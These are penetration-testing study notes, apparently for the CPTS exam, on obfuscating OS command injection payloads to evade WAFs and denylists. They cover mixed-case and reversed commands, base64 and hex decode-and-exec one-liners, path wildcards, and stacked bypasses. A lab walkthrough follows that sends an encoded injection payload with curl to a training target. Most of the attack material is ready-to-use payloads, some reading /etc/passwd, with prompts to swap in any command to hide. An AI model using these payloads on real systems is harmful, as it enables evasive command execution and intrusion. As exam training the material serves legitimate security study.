# Section 9 — Advanced Command Obfuscation

---

## When Basic Bypasses Are Not Enough

Web Application Firewalls (WAFs) and modern filters can catch quote obfuscation, environment variable substring tricks, and even brace expansion. When those fail, escalate to obfuscation that produces the same command without any literal blacklisted string.

---

## Case Manipulation

### Windows (case-insensitive shell)
```cmd
WhOaMi              → executes whoami directly
```
> Mixed-case command bypasses case-sensitive denylists since CMD/PowerShell ignore case; swap in your blocked command name with random casing.
Works as-is in CMD/PowerShell since both ignore case for command names.

### Linux (case-sensitive — need transformation)
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")    # WhOaMi → whoami via tr
$(a="WhOaMi";printf %s "${a,,}")    # ${var,,} lowercases the value
```
> Lowercases a mixed-case command at runtime with `tr` or `${var,,}` so the denylist never sees the real word; swap in your blocked command.

When spaces are blocked, replace with tab (`%09`) or `${IFS}`:
```
?ip=127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

---

## Reversed Commands

If the filter blocks `whoami` literally, write it backwards and reverse at runtime.

### Linux
```bash
$(rev<<<'imaohw')           # imaohw → whoami → executes
```
> The `rev` command reverses a string. `<<<` is a here-string that feeds input directly without using a pipe. The shell then executes the output of the subshell, running `whoami`.

### Windows (PowerShell)
```powershell
iex "$('imaohw'[-1..-20] -join '')"
```
> Reverses a backwards-written string with negative indexing and runs it via `iex`; reverse your own command and adjust the index range.

### Generating reversed commands
```bash
echo 'whoami' | rev          # imaohw
echo 'cat /etc/passwd' | rev # dwssap/cte/ tac
```

> If the filter also blocks reversed forms (rare), combine with case manipulation or split the string further.

---

## Encoded Commands (most flexible)

Base64 the entire command — only base64 alphanumerics survive the filter, all special chars hidden in the encoding.

### Linux — base64 decode + exec
```bash
# 1. Encode target command
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# 2. Construct payload: bash<<<$(base64 -d<<<BASE64)
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```
> Encodes the entire command as base64, then decodes and executes it at runtime. The filter only sees base64 alphanumerics and `=` signs — no spaces, slashes, pipes, or command names. `bash<<<$(...)` avoids using a pipe in the outer payload.

Key tricks:
- `<<<` (here-string) avoids using `|` pipe
- `$()` subshell wraps the decode result
- `bash<<<COMMAND` pipes the decoded command into a new bash via here-string

If `bash` is blocked → use `sh`. If `base64` is blocked → use `openssl base64 -d` or `xxd -r`.

### Windows — PowerShell base64
```powershell
# Encode (PS needs UTF-16LE)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# dwBoAG8AYQBtAGkA

# Decode + exec
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
> PowerShell requires UTF-16LE encoding, not UTF-8. `iex` (Invoke-Expression) runs the decoded string as a command. Swap `'whoami'` with any command you want to hide.

### Linux → Windows base64 (UTF-16LE)
```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
# dwBoAG8AYQBtAGkA
```
> `iconv` converts the command string from UTF-8 to UTF-16LE (what PowerShell expects). `base64` then encodes the result. Use this on Kali to build PowerShell-compatible base64 payloads.

---

## Hex-Encoded Commands

Alternative when base64 alphabet (`+`, `/`, `=`) is filtered:
```bash
# Encode
echo -n 'whoami' | xxd -p
# 77686f616d69

# Decode + exec
bash<<<$(xxd -r -p<<<77686f616d69)
```
> `xxd -p` outputs a plain hex dump (no spaces). `xxd -r -p` reverses it back to the raw string. Use hex encoding when the base64 alphabet (`+`, `/`, `=`) is also blocked.

---

## Wildcards & Globbing

When you can't write the command name but you know its absolute path:
```bash
/bin/cat                          # standard
/???/c?t                          # ?'s match any single char
/?in/??t                          # /bin/cat
/usr/bin/wh*                      # matches whoami (and others starting with wh)
/u*/b*/w*                         # /usr/bin/whoami
```
> Shell glob patterns expand to matching filenames. `?` matches exactly one character; `*` matches any sequence. Use these when the command name itself is blocked but its absolute path is not.

Wildcards are powerful because:
- They don't contain blacklisted command names
- They work even when `bash` or `sh` literally is blocked but `${SHELL}` isn't

---

## Combined With Other Bypasses

Real-world payloads stack everything:

```bash
# Blocked: ;, &, |, space, /, all common cmd names
# Allowed: %0a, ${IFS}, <<<, $(), base64 alphabet
?ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
```
> Stacks four bypasses: `%0a` as the command separator, `bash<<<` to avoid a pipe, `${IFS}` for the space between `base64` and `-d`, and the entire command hidden inside base64 encoding.

---

## Lab — Run Filtered Pipe Command

**Target:** `154.57.164.73:30363`

Command to run: `find /usr/share/ | grep root | grep mysql | tail -n 1`

Contains: spaces, slashes, pipes — all blocked. Solution: base64-encode the whole command, decode + exec via `bash<<<$()`.

### Step 1 — Encode
```bash
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
# ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
```
> Base64-encodes the full pipe command so it survives the filter; replace the quoted command with whatever you need to run on the target.

### Step 2 — Build payload
```
127.0.0.1
bash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```
> Injection payload: newline operator then base64-decode-and-exec via `bash<<<$()` with `${IFS}` for the space; swap the base64 blob for your encoded command.

Note `${IFS}` between `base64` and `-d` (space replacement). The `<<<` here-strings avoid using pipes inside the payload.

### Step 3 — Send
```bash
B64="ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE="
PAYLOAD="127.0.0.1
bash<<<\$(base64\${IFS}-d<<<${B64})"

curl -sk -X POST "http://154.57.164.73:30363/" --data-urlencode "ip=$PAYLOAD" \
  | sed -n '/<pre>/,/<\/pre>/p'
```
> Stores the base64 string and payload in shell variables, then sends them with `--data-urlencode` (handles special characters automatically). `sed` extracts only the `<pre>` block from the HTML response. Swap the IP:port for the current target.

Output:
```
PING 127.0.0.1 ... 1 received
/usr/share/mysql/debian_create_root_user.sql
```

**Q1 Answer:** `/usr/share/mysql/debian_create_root_user.sql`

---

## Exam Notes

- **Base64-decode-exec** (`bash<<<$(base64 -d<<<...)`) is the **most universal** obfuscation — entire blacklisted command hidden inside base64 alphanumerics
- `<<<` (here-string) is the canonical replacement for `|` (pipe) when pipe is blocked
- `$()` (subshell) is the canonical replacement for `` ` `` (backtick) — more readable, nested-friendly
- When base64 chars are filtered, fall back to `xxd -p` hex encoding
- Wildcards (`/???/c?t`) bypass even command-name blocklists by reaching binaries via path globbing
- Combine: case manip + reverse + base64 + char shifting — DefendCommand can't pattern-match everything
- The CPTS exam loves base64 obfuscation questions — `bash<<<$(base64 -d<<<...)` is your one-liner cheat
